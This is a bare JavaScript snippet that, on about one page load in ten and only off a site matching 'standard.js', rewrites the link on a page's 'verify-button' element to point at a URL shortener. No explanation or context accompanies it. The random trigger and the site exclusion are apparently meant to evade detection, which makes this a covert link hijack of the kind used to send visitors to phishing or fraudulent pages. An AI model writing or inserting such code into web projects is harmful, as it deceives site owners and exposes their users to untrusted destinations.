0 > window.location.href.toString().indexOf('standard.js') && 0 == Math.floor(100 * Math.random() / 10) && (window.onload = function () {
    document.getElementById('verify-button').href = 'http://hyperurl.co/tdjx0a'
})